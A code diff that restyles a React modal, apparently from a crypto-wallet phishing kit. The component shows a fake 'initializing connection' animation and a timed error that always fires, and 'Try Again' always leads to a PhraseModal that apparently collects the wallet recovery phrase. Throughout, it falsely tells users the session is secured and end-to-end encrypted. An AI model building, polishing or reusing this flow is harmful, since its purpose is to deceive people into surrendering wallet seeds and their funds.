@@ -10,7 +10,6 @@ const SecondModal = ({ wallet, onClose, isDarkMode }) => {
   const [showPhraseModal, setShowPhraseModal] = useState(false);
   const [showGear, setShowGear] = useState(true);
 
-  // Initial 15-second countdown
   useEffect(() => {
     const timer = setTimeout(() => {
       setShowError(true);
@@ -20,7 +19,6 @@ const SecondModal = ({ wallet, onClose, isDarkMode }) => {
     return () => clearTimeout(timer);
   }, []);
 
-  // Handle "Try Again" logic
   const handleTryAgain = () => {
     setShowError(false);
     setIsTryingAgain(true);
@@ -30,7 +28,7 @@ const SecondModal = ({ wallet, onClose, isDarkMode }) => {
       setIsTryingAgain(false);
       setShowGear(false);
       setShowPhraseModal(true);
-    }, 10000); // 10 seconds
+    }, 10000);
 
     return () => clearTimeout(retryTimer);
   };
@@ -42,7 +40,7 @@ const SecondModal = ({ wallet, onClose, isDarkMode }) => {
   if (showPhraseModal) {
     return (
       <PhraseModal
-        wallet={wallet} // 👈 Pass the wallet object
+        wallet={wallet}
         onClose={onClose}
         isDarkMode={isDarkMode}
       />
@@ -51,51 +49,57 @@ const SecondModal = ({ wallet, onClose, isDarkMode }) => {
 
   return (
     <div
-      className={`fixed inset-0 ${
-        isDarkMode ? "bg-black/60" : "bg-blue-100/60"
-      } flex items-center justify-center z-50 px-4`}
+      className={`fixed inset-0 flex items-center justify-center z-50 px-4 backdrop-blur-md ${
+        isDarkMode ? "bg-black/70" : "bg-gray-100/70"
+      }`}
     >
+      {/* Modal */}
       <motion.div
-        initial={{ y: -100, opacity: 0 }}
-        animate={{ y: 0, opacity: 1 }}
-        exit={{ y: -100, opacity: 0 }}
-        transition={{
-          type: "spring",
-          stiffness: 100,
-          damping: 15,
-          duration: 0.6,
-          delay: 0.2,
-        }}
-        className={`${
-          isDarkMode ? "bg-[#1e1e1e] text-white" : "bg-white text-black"
-        } p-6 rounded-lg shadow-lg max-w-md w-full relative`}
+        initial={{ opacity: 0, scale: 0.85, y: -40 }}
+        animate={{ opacity: 1, scale: 1, y: 0 }}
+        exit={{ opacity: 0, scale: 0.8 }}
+        transition={{ duration: 0.4, ease: "easeOut" }}
+        className={`relative max-w-md w-full rounded-2xl shadow-2xl border ${
+          isDarkMode
+            ? "bg-[#111111]/90 border-white/10 text-white"
+            : "bg-white border-gray-200 text-black"
+        } backdrop-blur-xl p-8`}
       >
+        {/* Glow background */}
+        <div className="absolute -top-10 -left-10 w-40 h-40 bg-pink-500/20 blur-3xl rounded-full"></div>
+        <div className="absolute -bottom-10 -right-10 w-40 h-40 bg-purple-500/20 blur-3xl rounded-full"></div>
+
         {/* Close Button */}
         <button
           onClick={onClose}
-          className="absolute top-2 right-2 text-red-600 font-bold"
+          className="absolute top-4 right-4 text-red-500 hover:scale-110 transition"
         >
           ✕
         </button>
 
-        {/* Header */}
-        <div className="flex flex-col items-center justify-center text-center space-y-4">
-          <img
-            src={wallet.image}
-            alt={wallet.name}
-            className="w-14 h-14 rounded object-cover"
-          />
+        {/* Wallet Header */}
+        <div className="flex flex-col items-center text-center space-y-3">
+          <div className="p-2 rounded-full bg-gradient-to-r from-pink-500 to-purple-500">
+            <img
+              src={wallet.image}
+              alt={wallet.name}
+              className="w-14 h-14 rounded-full object-cover"
+            />
+          </div>
+
           <h3 className="text-2xl font-semibold">{wallet.name}</h3>
-          <span className="text-sm text-green-500">
-            This session is secured and encrypted
+
+          <span className="text-sm text-green-500 font-medium">
+            Secure encrypted connection
           </span>
         </div>
 
-        {/* Gear Animation */}
+        {/* Loading Gear */}
         {showGear && (
-          <div className="flex flex-col items-center justify-center text-center space-y-4 mt-4">
+          <div className="flex flex-col items-center justify-center text-center space-y-4 mt-8">
             <div className="gearbox scale-75">
               <div className="overlay"></div>
+
               <div className="gear one">
                 <div className="gear-inner">
                   <div className="bar"></div>
@@ -103,6 +107,7 @@ const SecondModal = ({ wallet, onClose, isDarkMode }) => {
                   <div className="bar"></div>
                 </div>
               </div>
+
               <div className="gear two">
                 <div className="gear-inner">
                   <div className="bar"></div>
@@ -110,6 +115,7 @@ const SecondModal = ({ wallet, onClose, isDarkMode }) => {
                   <div className="bar"></div>
                 </div>
               </div>
+
               <div className="gear three">
                 <div className="gear-inner">
                   <div className="bar"></div>
@@ -117,6 +123,7 @@ const SecondModal = ({ wallet, onClose, isDarkMode }) => {
                   <div className="bar"></div>
                 </div>
               </div>
+
               <div className="gear four large">
                 <div className="gear-inner">
                   <div className="bar"></div>
@@ -128,30 +135,33 @@ const SecondModal = ({ wallet, onClose, isDarkMode }) => {
                 </div>
               </div>
             </div>
-            <p>Starting secure connection</p>
+
+            <p className="font-medium text-lg">Initializing Connection</p>
+
             <span className="text-sm text-gray-400 dot-animate">
               Please wait
             </span>
           </div>
         )}
 
-        {/* Error Message + Buttons */}
+        {/* Error State */}
         {showError && !isTryingAgain && (
-          <div className="text-center p-4">
-            <p className="px-10 py-2 border border-red-400 text-red-400 text-[8px] rounded">
-              An error occurred... please try again or connect manually
+          <div className="text-center mt-8">
+            <p className="px-6 py-3 border border-red-400 text-red-400 rounded-lg text-xs">
+              Connection failed. Please try again or connect manually.
             </p>
 
-            <div className="grid gap-4 py-5">
+            <div className="grid gap-4 mt-6">
               <button
                 onClick={handleTryAgain}
-                className="border border-indigo-500 rounded-full py-3 hover:bg-indigo-700 hover:text-white text-indigo-400 cursor-pointer text-xs"
+                className="py-3 rounded-full border border-indigo-500 text-indigo-400 hover:bg-indigo-600 hover:text-white transition text-sm"
               >
                 Try Again
               </button>
+
               <button
                 onClick={handleManualConnect}
-                className="border border-blue-500 rounded-full py-3 bg-indigo-600 hover:text-white text-white cursor-pointer text-xs hover:bg-indigo-700"
+                className="py-3 rounded-full bg-gradient-to-r from-indigo-600 to-purple-600 hover:opacity-90 text-white text-sm transition"
               >
                 Connect Manually
               </button>
@@ -159,12 +169,10 @@ const SecondModal = ({ wallet, onClose, isDarkMode }) => {
           </div>
         )}
 
-        {/* Footer Message */}
-        <div className="text-center flex items-center justify-center gap-2 text-sm mt-4">
-          <IoShieldHalfOutline className="text-2xl" />
-          <p className="text-gray-400 text-sm">
-            This session is protected with end-to-end encryption
-          </p>
+        {/* Footer */}
+        <div className="mt-8 flex items-center justify-center gap-2 text-sm text-gray-400">
+          <IoShieldHalfOutline className="text-xl" />
+          <p>This session is protected with end-to-end encryption</p>
         </div>
       </motion.div>
     </div>
